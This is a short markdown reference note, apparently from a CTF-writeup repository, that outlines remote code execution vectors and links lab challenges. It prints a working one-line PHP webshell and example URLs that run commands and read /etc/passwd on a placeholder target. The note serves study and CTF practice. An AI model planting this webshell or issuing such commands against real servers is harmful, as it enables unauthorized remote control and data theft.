# Remote Code Execution (RCE)

## Table of Contents

- [Remote Code Execution (RCE)](#remote-code-execution-rce)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Vectors Covered](#vectors-covered)
    - [PHP file upload / webshell](#php-file-upload--webshell)
    - [SSTI to RCE](#ssti-to-rce)
    - [Deserialization](#deserialization)
  - [Webshell Reference](#webshell-reference)
  - [References](#references)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Techniques for achieving RCE through web application vulnerabilities.

---

## Vectors Covered

### PHP file upload / webshell
Upload a malicious PHP file to a server that allows unrestricted file uploads, then trigger execution via a direct HTTP request.

### SSTI to RCE
Escalate a server-side template injection vulnerability to OS command execution. See [`../ssti/`](../ssti/README.md).

### Deserialization
Exploit unsafe deserialization of user-controlled objects to execute arbitrary code.

---

## Webshell Reference

Minimal PHP webshell for upload scenarios:

```php
<?php system($_GET['cmd']); ?>
```

Usage after upload:
```
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=cat+/etc/passwd
```

---

## References

### Challenges
| Source | Name |
|---|---|
| Immersive Labs: Haunted Hollow, Lab 9 | [Mirrored Mayhem](../../../ctf-writeups/immersive-labs/01-haunted-hollow/lab-9-mirrored-mayhem/README.md) |
| Holiday Hack Challenge 2024, Act III | [Deactivate the Ransomware](../../../ctf-writeups/holiday-hack-challenge/2024/act-iii/frostbit-deactivate-the-ransomware/README.md) |

### Web Sites
- [PayloadsAllTheThings - File Upload](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)
